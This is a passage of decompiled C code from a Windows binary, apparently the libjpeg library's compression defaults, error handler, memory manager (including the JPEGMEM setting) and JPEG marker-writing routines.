      *(undefined4 *)(iVar2 + 0xc0) = 1;
      iVar2 = param_1[0x11];
      puVar4 = (undefined4 *)(iVar2 + 0xfc);
      *puVar4 = 4;
      *(undefined4 *)(iVar2 + 0x104) = 2;
      *(undefined4 *)(iVar2 + 0x108) = 2;
      goto LAB_00409a8a;
    }
    puVar4 = (undefined4 *)param_1[0x11];
    param_1[0xf] = 4;
    *(undefined *)(param_1 + 0x33) = 1;
    *puVar4 = 0x43;
    puVar4[2] = 1;
    puVar4[3] = 1;
    puVar4[4] = 0;
    puVar4[5] = 0;
    puVar4[6] = 0;
    iVar2 = param_1[0x11];
    *(undefined4 *)(iVar2 + 0x54) = 0x4d;
    *(undefined4 *)(iVar2 + 0x5c) = 1;
    *(undefined4 *)(iVar2 + 0x60) = 1;
    *(undefined4 *)(iVar2 + 100) = 0;
    *(undefined4 *)(iVar2 + 0x68) = 0;
    *(undefined4 *)(iVar2 + 0x6c) = 0;
    iVar2 = param_1[0x11];
    *(undefined4 *)(iVar2 + 0xa8) = 0x59;
    *(undefined4 *)(iVar2 + 0xb0) = 1;
    *(undefined4 *)(iVar2 + 0xb4) = 1;
    *(undefined4 *)(iVar2 + 0xb8) = 0;
    *(undefined4 *)(iVar2 + 0xbc) = 0;
    *(undefined4 *)(iVar2 + 0xc0) = 0;
    puVar4 = (undefined4 *)(param_1[0x11] + 0xfc);
    *puVar4 = 0x4b;
  }
  puVar4[2] = 1;
  puVar4[3] = 1;
LAB_00409a8a:
  puVar4[4] = 0;
  puVar4[5] = 0;
  puVar4[6] = 0;
  return;
}



void __cdecl FUN_00409af1(int *param_1)

{
  int iVar1;
  
  iVar1 = param_1[10];
  if (iVar1 == 0) {
    iVar1 = 0;
  }
  else if (iVar1 == 1) {
    iVar1 = 1;
  }
  else if ((iVar1 == 2) || (iVar1 == 3)) {
    iVar1 = 3;
  }
  else if (iVar1 == 4) {
    iVar1 = 4;
  }
  else {
    if (iVar1 != 5) {
      *(undefined4 *)(*param_1 + 0x14) = 9;
      (**(code **)*param_1)(param_1);
      return;
    }
    iVar1 = 5;
  }
  FUN_00409869(param_1,iVar1);
  return;
}



void __cdecl FUN_00409b37(int *param_1)

{
  int iVar1;
  int *piVar2;
  
  if (param_1[5] != 100) {
    *(undefined4 *)(*param_1 + 0x14) = 0x14;
    *(int *)(*param_1 + 0x18) = param_1[5];
    (**(code **)*param_1)(param_1);
  }
  if (param_1[0x11] == 0) {
    iVar1 = (**(code **)param_1[1])(param_1,0,0x348);
    param_1[0x11] = iVar1;
  }
  param_1[0xe] = 8;
  FUN_0040978c(param_1,0x4b,'\x01');
  FUN_00409815();
  piVar2 = param_1 + 0x22;
  iVar1 = 0x10;
  do {
    *(undefined *)(piVar2 + -4) = 0;
    *(undefined *)piVar2 = 1;
    *(undefined *)(piVar2 + 4) = 5;
    piVar2 = (int *)((int)piVar2 + 1);
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  param_1[0x2b] = 0;
  param_1[0x2a] = 0;
  *(undefined *)(param_1 + 0x2c) = 0;
  *(undefined *)((int)param_1 + 0xb1) = 0;
  *(undefined *)((int)param_1 + 0xb2) = 0;
  if (8 < param_1[0xe]) {
    *(undefined *)((int)param_1 + 0xb2) = 1;
  }
  *(undefined *)((int)param_1 + 0xb3) = 0;
  param_1[0x2d] = 0;
  param_1[0x2e] = 0;
  param_1[0x2f] = 0;
  param_1[0x30] = 0;
  *(undefined *)((int)param_1 + 0xc5) = 1;
  *(undefined *)((int)param_1 + 0xc6) = 1;
  *(undefined *)((int)param_1 + 199) = 0;
  *(undefined2 *)(param_1 + 0x32) = 1;
  *(undefined2 *)((int)param_1 + 0xca) = 1;
  FUN_00409af1(param_1);
  return;
}



void FUN_00409c19(int *param_1)

{
  (**(code **)(*param_1 + 8))(param_1);
  FUN_00409dda((int)param_1);
                    // WARNING: Subroutine does not return
  _exit(1);
}



void __cdecl FUN_00409d5b(undefined **param_1)

{
  *param_1 = FUN_00409c19;
  param_1[1] = &LAB_00409c82;
  param_1[2] = &LAB_00409c34;
  param_1[3] = &LAB_00409cb3;
  param_1[4] = &LAB_00409d4a;
  param_1[0x1a] = (undefined *)0x0;
  param_1[0x1b] = (undefined *)0x0;
  param_1[5] = (undefined *)0x0;
  param_1[0x1c] = (undefined *)&PTR_s_Bogus_message_code__d_004249c0;
  param_1[0x1d] = (undefined *)0x7b;
  param_1[0x1e] = (undefined *)0x0;
  param_1[0x1f] = (undefined *)0x0;
  param_1[0x20] = (undefined *)0x0;
  return;
}



void __cdecl FUN_00409da7(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (**(code **)(*(int *)(param_1 + 4) + 0x24))(param_1,1);
    if (*(char *)(param_1 + 0x10) != '\0') {
      *(undefined4 *)(param_1 + 0x10c) = 0;
      *(undefined4 *)(param_1 + 0x14) = 200;
      return;
    }
    *(undefined4 *)(param_1 + 0x14) = 100;
  }
  return;
}



void __cdecl FUN_00409dda(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    (**(code **)(*(int *)(param_1 + 4) + 0x28))(param_1);
  }
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  return;
}



void __cdecl FUN_00409df5(int param_1)

{
  int iVar1;
  
  iVar1 = (***(code ***)(param_1 + 4))(param_1,0,0x82);
  *(undefined *)(iVar1 + 0x80) = 0;
  return;
}



void __cdecl FUN_00409e11(int param_1)

{
  int iVar1;
  
  iVar1 = (***(code ***)(param_1 + 4))(param_1,0,0x112);
  *(undefined *)(iVar1 + 0x111) = 0;
  return;
}



int __cdecl FUN_00409e2d(int param_1,int param_2)

{
  return (param_1 + -1 + param_2) / param_2;
}



int __cdecl FUN_00409e3d(int param_1,int param_2)

{
  int iVar1;
  
  iVar1 = param_1 + -1 + param_2;
  return iVar1 - iVar1 % param_2;
}



void __cdecl
FUN_00409e55(int param_1,int param_2,int param_3,int param_4,int param_5,size_t param_6)

{
  void *_Src;
  void *_Dst;
  void **ppvVar1;
  void **ppvVar2;
  
  ppvVar1 = (void **)(param_1 + param_2 * 4);
  ppvVar2 = (void **)(param_3 + param_4 * 4);
  for (; 0 < param_5; param_5 = param_5 + -1) {
    _Src = *ppvVar1;
    _Dst = *ppvVar2;
    ppvVar1 = ppvVar1 + 1;
    ppvVar2 = ppvVar2 + 1;
    _memcpy(_Dst,_Src,param_6);
  }
  return;
}



void __cdecl FUN_00409e93(void *param_1,size_t param_2)

{
  _memset(param_1,0,param_2);
  return;
}



void __fastcall FUN_00409ea6(undefined4 param_1,undefined4 param_2)

{
  int *in_EAX;
  
  *(undefined4 *)(*in_EAX + 0x14) = 0x36;
  *(undefined4 *)(*in_EAX + 0x18) = param_2;
  (**(code **)*in_EAX)();
  return;
}



int __thiscall FUN_00409ebb(void *this,int *param_1,int param_2,undefined4 *param_3)

{
  int *piVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  uint uVar7;
  size_t sVar8;
  
  iVar3 = param_1[1];
  if ((undefined4 *)0x3b9ac9f0 < param_3) {
    FUN_00409ea6(this,1);
  }
  puVar6 = param_3;
  if (((uint)param_3 & 7) != 0) {
    puVar6 = (undefined4 *)((int)param_3 + (8 - ((uint)param_3 & 7)));
  }
  if ((param_2 < 0) || (1 < param_2)) {
    *(undefined4 *)(*param_1 + 0x14) = 0xe;
    *(int *)(*param_1 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  param_3 = (undefined4 *)0x0;
  puVar2 = (undefined4 *)(iVar3 + 0x34 + param_2 * 4);
  puVar5 = (undefined4 *)*puVar2;
  if (puVar5 != (undefined4 *)0x0) {
    do {
      puVar4 = puVar5;
      puVar5 = puVar4;
      if (puVar6 <= (undefined4 *)puVar4[2]) break;
      puVar5 = (undefined4 *)*puVar4;
      param_3 = puVar4;
    } while (puVar5 != (undefined4 *)0x0);
    if (puVar5 != (undefined4 *)0x0) goto LAB_00409fa1;
  }
  puVar4 = puVar6 + 4;
  if (param_3 == (undefined4 *)0x0) {
    uVar7 = *(uint *)(&DAT_00424cf8 + param_2 * 4);
  }
  else {
    uVar7 = *(uint *)(&DAT_00424d00 + param_2 * 4);
  }
  if (1000000000U - (int)puVar4 < uVar7) {
    uVar7 = 1000000000U - (int)puVar4;
  }
  while( true ) {
    sVar8 = uVar7 + (int)puVar4;
    puVar5 = (undefined4 *)FUN_0040b14c(param_1,sVar8);
    if (puVar5 != (undefined4 *)0x0) break;
    uVar7 = uVar7 >> 1;
    if (uVar7 < 0x32) {
      FUN_00409ea6(sVar8,2);
    }
  }
  piVar1 = (int *)(iVar3 + 0x4c);
  *piVar1 = (int)puVar4 + *piVar1 + uVar7;
  *puVar5 = 0;
  puVar5[1] = 0;
  puVar5[2] = uVar7 + (int)puVar6;
  if (param_3 == (undefined4 *)0x0) {
    param_3 = puVar2;
  }
  *param_3 = puVar5;
LAB_00409fa1:
  iVar3 = puVar5[1];
  puVar5[2] = puVar5[2] - (int)puVar6;
  puVar5[1] = iVar3 + (int)puVar6;
  return iVar3 + 0x10 + (int)puVar5;
}



undefined4 * __thiscall FUN_00409fb7(void *this,int *param_1,int param_2,uint param_3)

{
  int *piVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  size_t sVar6;
  
  iVar3 = param_1[1];
  if (0x3b9ac9f0 < param_3) {
    FUN_00409ea6(this,3);
  }
  if ((param_3 & 7) != 0) {
    param_3 = param_3 + (8 - (param_3 & 7));
  }
  if ((param_2 < 0) || (1 < param_2)) {
    *(undefined4 *)(*param_1 + 0x14) = 0xe;
    *(int *)(*param_1 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  sVar6 = param_3 + 0x10;
  puVar5 = (undefined4 *)FUN_0040b14c(param_1,sVar6);
  if (puVar5 == (undefined4 *)0x0) {
    FUN_00409ea6(sVar6,4);
  }
  piVar1 = (int *)(iVar3 + 0x4c);
  *piVar1 = *piVar1 + param_3 + 0x10;
  puVar2 = (undefined4 *)(iVar3 + 0x3c + param_2 * 4);
  uVar4 = *puVar2;
  puVar5[2] = 0;
  puVar5[1] = param_3;
  *puVar5 = uVar4;
  *puVar2 = puVar5;
  return puVar5 + 4;
}



int __cdecl FUN_0040a045(int *param_1,int param_2,uint param_3,uint param_4)

{
  uint uVar1;
  int iVar2;
  undefined4 *puVar3;
  int *this;
  void *extraout_ECX;
  void *this_00;
  uint uVar4;
  uint uVar5;
  
  uVar1 = (uint)(0x3b9ac9f0 / (ulonglong)param_3);
  iVar2 = param_1[1];
  this = param_1;
  if (uVar1 == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x46;
    (**(code **)*param_1)();
  }
  if ((int)param_4 <= (int)uVar1) {
    uVar1 = param_4;
  }
  *(uint *)(iVar2 + 0x50) = uVar1;
  iVar2 = FUN_00409ebb(this,param_1,param_2,(undefined4 *)(param_4 << 2));
  uVar5 = 0;
  this_00 = extraout_ECX;
  if (param_4 != 0) {
    do {
      if (param_4 - uVar5 <= uVar1) {
        uVar1 = param_4 - uVar5;
      }
      puVar3 = FUN_00409fb7(this_00,param_1,param_2,uVar1 * param_3);
      for (uVar4 = uVar1; uVar4 != 0; uVar4 = uVar4 - 1) {
        *(undefined4 **)(iVar2 + uVar5 * 4) = puVar3;
        puVar3 = (undefined4 *)((int)puVar3 + param_3);
        uVar5 = uVar5 + 1;
      }
      this_00 = (void *)0x0;
    } while (uVar5 < param_4);
  }
  return iVar2;
}



int __cdecl FUN_0040a0d7(int *param_1,int param_2,int param_3,uint param_4)

{
  uint uVar1;
  int iVar2;
  undefined4 *puVar3;
  int *this;
  void *extraout_ECX;
  void *this_00;
  uint uVar4;
  uint uVar5;
  
  this = (int *)(param_3 * 0x80);
  uVar1 = (uint)(0x3b9ac9f0 / ZEXT48(this));
  iVar2 = param_1[1];
  if (uVar1 == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x46;
    this = param_1;
    (**(code **)*param_1)();
  }
  if ((int)param_4 <= (int)uVar1) {
    uVar1 = param_4;
  }
  *(uint *)(iVar2 + 0x50) = uVar1;
  iVar2 = FUN_00409ebb(this,param_1,param_2,(undefined4 *)(param_4 << 2));
  uVar5 = 0;
  this_00 = extraout_ECX;
  if (param_4 != 0) {
    do {
      if (param_4 - uVar5 <= uVar1) {
        uVar1 = param_4 - uVar5;
      }
      puVar3 = FUN_00409fb7(this_00,param_1,param_2,uVar1 * param_3 * 0x80);
      for (uVar4 = uVar1; uVar4 != 0; uVar4 = uVar4 - 1) {
        *(undefined4 **)(iVar2 + uVar5 * 4) = puVar3;
        puVar3 = puVar3 + param_3 * 0x20;
        uVar5 = uVar5 + 1;
      }
      this_00 = (void *)0x0;
    } while (uVar5 < param_4);
  }
  return iVar2;
}



void __thiscall
FUN_0040a175(void *this,int *param_1,int param_2,undefined param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = param_1[1];
  if (param_2 != 1) {
    *(undefined4 *)(*param_1 + 0x14) = 0xe;
    *(int *)(*param_1 + 0x18) = param_2;
    this = param_1;
    (**(code **)*param_1)();
  }
  puVar2 = (undefined4 *)FUN_00409ebb(this,param_1,param_2,(undefined4 *)0x78);
  puVar2[1] = param_5;
  puVar2[2] = param_4;
  puVar2[3] = param_6;
  *puVar2 = 0;
  *(undefined *)(puVar2 + 8) = param_3;
  *(undefined *)((int)puVar2 + 0x22) = 0;
  puVar2[9] = *(undefined4 *)(iVar1 + 0x44);
  *(undefined4 **)(iVar1 + 0x44) = puVar2;
  return;
}



void __thiscall
FUN_0040a1d6(void *this,int *param_1,int param_2,undefined param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = param_1[1];
  if (param_2 != 1) {
    *(undefined4 *)(*param_1 + 0x14) = 0xe;
    *(int *)(*param_1 + 0x18) = param_2;
    this = param_1;
    (**(code **)*param_1)();
  }
  puVar2 = (undefined4 *)FUN_00409ebb(this,param_1,param_2,(undefined4 *)0x78);
  puVar2[1] = param_5;
  puVar2[2] = param_4;
  puVar2[3] = param_6;
  *puVar2 = 0;
  *(undefined *)(puVar2 + 8) = param_3;
  *(undefined *)((int)puVar2 + 0x22) = 0;
  puVar2[9] = *(undefined4 *)(iVar1 + 0x48);
  *(undefined4 **)(iVar1 + 0x48) = puVar2;
  return;
}



void __cdecl FUN_0040a237(int *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int local_8;
  
  iVar1 = param_1[1];
  iVar4 = 0;
  iVar3 = 0;
  for (piVar2 = *(int **)(iVar1 + 0x44); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[9]) {
    if (*piVar2 == 0) {
      iVar4 = iVar4 + piVar2[3] * piVar2[2];
      iVar3 = iVar3 + piVar2[1] * piVar2[2];
    }
  }
  for (piVar2 = *(int **)(iVar1 + 0x48); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[9]) {
    if (*piVar2 == 0) {
      iVar4 = iVar4 + piVar2[3] * piVar2[2] * 0x80;
      iVar3 = iVar3 + piVar2[1] * piVar2[2] * 0x80;
    }
  }
  if (0 < iVar4) {
    local_8 = FUN_0040b157(param_1,iVar4,iVar3);
    if (local_8 < iVar3) {
      local_8 = local_8 / iVar4;
      if (local_8 < 1) {
        local_8 = 1;
      }
    }
    else {
      local_8 = 1000000000;
    }
    for (piVar2 = *(int **)(iVar1 + 0x44); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[9]) {
      if (*piVar2 == 0) {
        if (local_8 < (int)((piVar2[1] - 1U) / (uint)piVar2[3] + 1)) {
          piVar2[4] = piVar2[3] * local_8;
          FUN_0040b15c(param_1);
          *(undefined *)((int)piVar2 + 0x22) = 1;
        }
        else {
          piVar2[4] = piVar2[1];
        }
        iVar3 = FUN_0040a045(param_1,1,piVar2[2],piVar2[4]);
        *piVar2 = iVar3;
        iVar3 = *(int *)(iVar1 + 0x50);
        piVar2[6] = 0;
        piVar2[7] = 0;
        piVar2[5] = iVar3;
        *(undefined *)((int)piVar2 + 0x21) = 0;
      }
    }
    for (piVar2 = *(int **)(iVar1 + 0x48); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[9]) {
      if (*piVar2 == 0) {
        if (local_8 < (int)((piVar2[1] - 1U) / (uint)piVar2[3] + 1)) {
          piVar2[4] = piVar2[3] * local_8;
          FUN_0040b15c(param_1);
          *(undefined *)((int)piVar2 + 0x22) = 1;
        }
        else {
          piVar2[4] = piVar2[1];
        }
        iVar3 = FUN_0040a0d7(param_1,1,piVar2[2],piVar2[4]);
        *piVar2 = iVar3;
        iVar3 = *(int *)(iVar1 + 0x50);
        piVar2[6] = 0;
        piVar2[7] = 0;
        piVar2[5] = iVar3;
        *(undefined *)((int)piVar2 + 0x21) = 0;
      }
    }
  }
  return;
}



void __cdecl FUN_0040a3b6(undefined4 param_1,char param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_ESI;
  int iVar5;
  
  iVar1 = unaff_ESI[2];
  iVar4 = unaff_ESI[6] * iVar1;
  iVar3 = unaff_ESI[4];
  iVar5 = 0;
  if (0 < iVar3) {
    do {
      iVar2 = iVar3 - iVar5;
      if (unaff_ESI[5] < iVar3 - iVar5) {
        iVar2 = unaff_ESI[5];
      }
      iVar3 = unaff_ESI[7] - (unaff_ESI[6] + iVar5);
      if (iVar3 <= iVar2) {
        iVar2 = iVar3;
      }
      iVar3 = unaff_ESI[1] - (unaff_ESI[6] + iVar5);
      if (iVar3 <= iVar2) {
        iVar2 = iVar3;
      }
      if (iVar2 < 1) {
        return;
      }
      iVar2 = iVar2 * iVar1;
      if (param_2 == '\0') {
        (*(code *)unaff_ESI[10])
                  (param_1,unaff_ESI + 10,*(undefined4 *)(*unaff_ESI + iVar5 * 4),iVar4,iVar2);
      }
      else {
        (*(code *)unaff_ESI[0xb])(param_1,unaff_ESI + 10,*(undefined4 *)(*unaff_ESI + iVar5 * 4));
      }
      iVar5 = iVar5 + unaff_ESI[5];
      iVar3 = unaff_ESI[4];
      iVar4 = iVar4 + iVar2;
    } while (iVar5 < iVar3);
  }
  return;
}



void __cdecl FUN_0040a43e(undefined4 param_1,char param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_ESI;
  int iVar5;
  
  iVar1 = unaff_ESI[2];
  iVar4 = unaff_ESI[6] * iVar1 * 0x80;
  iVar3 = unaff_ESI[4];
  iVar5 = 0;
  if (0 < iVar3) {
    do {
      iVar2 = iVar3 - iVar5;
      if (unaff_ESI[5] < iVar3 - iVar5) {
        iVar2 = unaff_ESI[5];
      }
      iVar3 = unaff_ESI[7] - (unaff_ESI[6] + iVar5);
      if (iVar3 <= iVar2) {
        iVar2 = iVar3;
      }
      iVar3 = unaff_ESI[1] - (unaff_ESI[6] + iVar5);
      if (iVar3 <= iVar2) {
        iVar2 = iVar3;
      }
      if (iVar2 < 1) {
        return;
      }
      iVar2 = iVar2 * iVar1 * 0x80;
      if (param_2 == '\0') {
        (*(code *)unaff_ESI[10])
                  (param_1,unaff_ESI + 10,*(undefined4 *)(*unaff_ESI + iVar5 * 4),iVar4,iVar2);
      }
      else {
        (*(code *)unaff_ESI[0xb])(param_1,unaff_ESI + 10,*(undefined4 *)(*unaff_ESI + iVar5 * 4));
      }
      iVar5 = iVar5 + unaff_ESI[5];
      iVar3 = unaff_ESI[4];
      iVar4 = iVar4 + iVar2;
    } while (iVar5 < iVar3);
  }
  return;
}



int __cdecl FUN_0040a4c9(int *param_1,int *param_2,uint param_3,uint param_4,char param_5)

{
  uint uVar1;
  size_t sVar2;
  int iVar3;
  uint uVar4;
  
  uVar1 = param_3 + param_4;
  if ((((uint)param_2[1] < uVar1) || ((uint)param_2[3] < param_4)) || (*param_2 == 0)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x16;
    (**(code **)*param_1)(param_1);
  }
  if ((param_3 < (uint)param_2[6]) || ((uint)(param_2[4] + param_2[6]) < uVar1)) {
    if (*(char *)((int)param_2 + 0x22) == '\0') {
      *(undefined4 *)(*param_1 + 0x14) = 0x45;
      (**(code **)*param_1)(param_1);
    }
    if (*(char *)((int)param_2 + 0x21) != '\0') {
      FUN_0040a3b6(param_1,'\x01');
      *(undefined *)((int)param_2 + 0x21) = 0;
    }
    uVar4 = param_3;
    if ((param_3 <= (uint)param_2[6]) && (uVar4 = uVar1 - param_2[4], (int)uVar4 < 0)) {
      uVar4 = 0;
    }
    param_2[6] = uVar4;
    FUN_0040a3b6(param_1,'\0');
  }
  uVar4 = param_2[7];
  if (uVar4 < uVar1) {
    if ((uVar4 < param_3) && (uVar4 = param_3, param_5 != '\0')) {
      *(undefined4 *)(*param_1 + 0x14) = 0x16;
      (**(code **)*param_1)(param_1);
    }
    if (param_5 != '\0') {
      param_2[7] = uVar1;
    }
    if (*(char *)(param_2 + 8) != '\0') {
      sVar2 = param_2[2];
      iVar3 = param_2[6];
      for (uVar4 = uVar4 - iVar3; uVar4 < uVar1 - iVar3; uVar4 = uVar4 + 1) {
        FUN_00409e93(*(void **)(*param_2 + uVar4 * 4),sVar2);
      }
      goto LAB_0040a5cd;
    }
    if (param_5 == '\0') {
      *(undefined4 *)(*param_1 + 0x14) = 0x16;
      (**(code **)*param_1)(param_1);
      goto LAB_0040a5cd;
    }
  }
  else {
LAB_0040a5cd:
    if (param_5 == '\0') goto LAB_0040a5d7;
  }
  *(undefined *)((int)param_2 + 0x21) = 1;
LAB_0040a5d7:
  return *param_2 + (param_3 - param_2[6]) * 4;
}



int __cdecl FUN_0040a5e7(int *param_1,int *param_2,uint param_3,uint param_4,char param_5)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  
  uVar1 = param_3 + param_4;
  if ((((uint)param_2[1] < uVar1) || ((uint)param_2[3] < param_4)) || (*param_2 == 0)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x16;
    (**(code **)*param_1)(param_1);
  }
  if ((param_3 < (uint)param_2[6]) || ((uint)(param_2[4] + param_2[6]) < uVar1)) {
    if (*(char *)((int)param_2 + 0x22) == '\0') {
      *(undefined4 *)(*param_1 + 0x14) = 0x45;
      (**(code **)*param_1)(param_1);
    }
    if (*(char *)((int)param_2 + 0x21) != '\0') {
      FUN_0040a43e(param_1,'\x01');
      *(undefined *)((int)param_2 + 0x21) = 0;
    }
    if ((uint)param_2[6] < param_3) {
      param_2[6] = param_3;
    }
    else {
      iVar3 = uVar1 - param_2[4];
      if (iVar3 < 0) {
        iVar3 = 0;
      }
      param_2[6] = iVar3;
    }
    FUN_0040a43e(param_1,'\0');
  }
  uVar4 = param_2[7];
  if (uVar4 < uVar1) {
    if ((uVar4 < param_3) && (uVar4 = param_3, param_5 != '\0')) {
      *(undefined4 *)(*param_1 + 0x14) = 0x16;
      (**(code **)*param_1)(param_1);
    }
    if (param_5 != '\0') {
      param_2[7] = uVar1;
    }
    if (*(char *)(param_2 + 8) != '\0') {
      iVar3 = param_2[6];
      iVar2 = param_2[2];
      for (uVar4 = uVar4 - iVar3; uVar4 < uVar1 - iVar3; uVar4 = uVar4 + 1) {
        FUN_00409e93(*(void **)(*param_2 + uVar4 * 4),iVar2 << 7);
      }
      goto LAB_0040a6f0;
    }
    if (param_5 == '\0') {
      *(undefined4 *)(*param_1 + 0x14) = 0x16;
      (**(code **)*param_1)(param_1);
      goto LAB_0040a6f0;
    }
  }
  else {
LAB_0040a6f0:
    if (param_5 == '\0') goto LAB_0040a6fa;
  }
  *(undefined *)((int)param_2 + 0x21) = 1;
LAB_0040a6fa:
  return *param_2 + (param_3 - param_2[6]) * 4;
}



void __cdecl FUN_0040a70a(int *param_1,int param_2)

{
  int iVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  int iVar5;
  
  iVar1 = param_1[1];
  if ((param_2 < 0) || (1 < param_2)) {
    *(undefined4 *)(*param_1 + 0x14) = 0xe;
    *(int *)(*param_1 + 0x18) = param_2;
    (**(code **)*param_1)(param_1);
  }
  if (param_2 == 1) {
    for (iVar5 = *(int *)(iVar1 + 0x44); iVar5 != 0; iVar5 = *(int *)(iVar5 + 0x24)) {
      if (*(char *)(iVar5 + 0x22) != '\0') {
        *(undefined *)(iVar5 + 0x22) = 0;
        (**(code **)(iVar5 + 0x30))(param_1,iVar5 + 0x28);
      }
    }
    *(undefined4 *)(iVar1 + 0x44) = 0;
    for (iVar5 = *(int *)(iVar1 + 0x48); iVar5 != 0; iVar5 = *(int *)(iVar5 + 0x24)) {
      if (*(char *)(iVar5 + 0x22) != '\0') {
        *(undefined *)(iVar5 + 0x22) = 0;
        (**(code **)(iVar5 + 0x30))(param_1,iVar5 + 0x28);
      }
    }
    *(undefined4 *)(iVar1 + 0x48) = 0;
  }
  puVar2 = *(undefined4 **)(iVar1 + 0x3c + param_2 * 4);
  *(undefined4 *)(iVar1 + 0x3c + param_2 * 4) = 0;
  while (puVar2 != (undefined4 *)0x0) {
    iVar5 = puVar2[2];
    iVar3 = puVar2[1];
    puVar4 = (undefined4 *)*puVar2;
    FUN_0040b141(param_1,puVar2);
    *(int *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) - (iVar5 + 0x10 + iVar3);
    puVar2 = puVar4;
  }
  puVar2 = (undefined4 *)(iVar1 + 0x34 + param_2 * 4);
  puVar4 = (undefined4 *)*puVar2;
  *puVar2 = 0;
  while (puVar4 != (undefined4 *)0x0) {
    iVar5 = puVar4[2];
    iVar3 = puVar4[1];
    puVar2 = (undefined4 *)*puVar4;
    FUN_0040b141(param_1,puVar4);
    *(int *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) - (iVar5 + 0x10 + iVar3);
    puVar4 = puVar2;
  }
  return;
}



void __cdecl FUN_0040a7eb(int *param_1)

{
  int iVar1;
  
  iVar1 = 1;
  do {
    FUN_0040a70a(param_1,iVar1);
    iVar1 = iVar1 + -1;
  } while (-1 < iVar1);
  FUN_0040b141(param_1,(void *)param_1[1]);
  param_1[1] = 0;
  FUN_00408aec();
  return;
}



void __cdecl FUN_0040a81b(int *param_1)

{
  int *piVar1;
  code **ppcVar2;
  code **ppcVar3;
  char *_Src;
  int iVar4;
  int *piVar5;
  code *local_8;
  
  piVar1 = param_1;
  param_1[1] = 0;
  local_8 = (code *)FUN_0040b170();
  ppcVar2 = (code **)FUN_0040b14c(piVar1,0x54);
  if (ppcVar2 == (code **)0x0) {
    piVar5 = piVar1;
    FUN_00408aec();
    *(undefined4 *)(*piVar1 + 0x14) = 0x36;
    *(undefined4 *)(*piVar1 + 0x18) = 0;
    (**(code **)*piVar1)(piVar1,piVar5);
  }
  *ppcVar2 = FUN_00409ebb;
  ppcVar2[1] = FUN_00409fb7;
  ppcVar2[2] = FUN_0040a045;
  ppcVar2[3] = FUN_0040a0d7;
  ppcVar2[4] = FUN_0040a175;
  ppcVar2[5] = FUN_0040a1d6;
  ppcVar2[6] = FUN_0040a237;
  ppcVar2[7] = FUN_0040a4c9;
  ppcVar2[8] = FUN_0040a5e7;
  ppcVar2[9] = FUN_0040a70a;
  ppcVar2[10] = FUN_0040a7eb;
  ppcVar2[0xc] = (code *)0x3b9aca00;
  ppcVar2[0xb] = local_8;
  iVar4 = 1;
  ppcVar3 = ppcVar2 + 0x10;
  do {
    ppcVar3[-2] = (code *)0x0;
    *ppcVar3 = (code *)0x0;
    iVar4 = iVar4 + -1;
    ppcVar3 = ppcVar3 + -1;
  } while (-1 < iVar4);
  ppcVar2[0x11] = (code *)0x0;
  ppcVar2[0x12] = (code *)0x0;
  ppcVar2[0x13] = (code *)0x54;
  piVar1[1] = (int)ppcVar2;
  _Src = _getenv("JPEGMEM");
  if (_Src != (char *)0x0) {
    param_1 = (int *)CONCAT13(0x78,param_1._0_3_);
    iVar4 = FID_conflict__sscanf(_Src,"%ld%c",&local_8,(int)&param_1 + 3);
    if (0 < iVar4) {
      if ((param_1._3_1_ == 'm') || (param_1._3_1_ == 'M')) {
        local_8 = (code *)((int)local_8 * 1000);
      }
      ppcVar2[0xb] = (code *)((int)local_8 * 1000);
    }
  }
  return;
}



void __cdecl FUN_0040a930(undefined param_1)

{
  int *piVar1;
  int *piVar2;
  char cVar3;
  int *unaff_ESI;
  
  piVar2 = (int *)unaff_ESI[6];
  *(undefined *)*piVar2 = param_1;
  *piVar2 = *piVar2 + 1;
  piVar1 = piVar2 + 1;
  *piVar1 = *piVar1 + -1;
  if (*piVar1 == 0) {
    cVar3 = (*(code *)piVar2[3])();
    if (cVar3 == '\0') {
      *(undefined4 *)(*unaff_ESI + 0x14) = 0x18;
      (**(code **)*unaff_ESI)();
    }
  }
  return;
}



void __cdecl FUN_0040a95b(undefined4 param_1)

{
  FUN_0040a930(0xff);
  FUN_0040a930((undefined)param_1);
  return;
}



void FUN_0040a975(void)

{
  undefined4 in_EAX;
  
  FUN_0040a930((char)((uint)in_EAX >> 8));
  FUN_0040a930((char)in_EAX);
  return;
}



char __fastcall FUN_0040a99a(int *param_1)

{
  undefined2 uVar1;
  int iVar2;
  bool bVar3;
  int in_EAX;
  int iVar4;
  int *local_c;
  
  iVar2 = param_1[in_EAX + 0x12];
  if (iVar2 == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x34;
    *(int *)(*param_1 + 0x18) = in_EAX;
    (**(code **)*param_1)(param_1);
  }
  iVar4 = 0;
  bVar3 = false;
  do {
    if (0xff < *(ushort *)(iVar2 + iVar4 * 2)) {
      bVar3 = true;
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 < 0x40);
